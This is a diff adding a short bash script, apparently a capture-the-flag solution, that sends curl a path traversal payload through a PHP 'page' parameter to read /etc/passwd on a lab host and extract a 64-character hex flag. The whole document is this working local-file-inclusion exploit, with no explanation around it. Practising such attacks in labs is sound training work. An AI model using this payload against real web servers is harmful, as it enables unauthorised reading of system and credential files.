@@ -1,0 +1,3 @@
+#!/usr/bin/bash
+
+curl -s -X GET "http://192.168.56.101/index.php?page=../../../../../../../../../etc/passwd" | grep -oP 'The flag is : \K[0-9a-f]{64}'
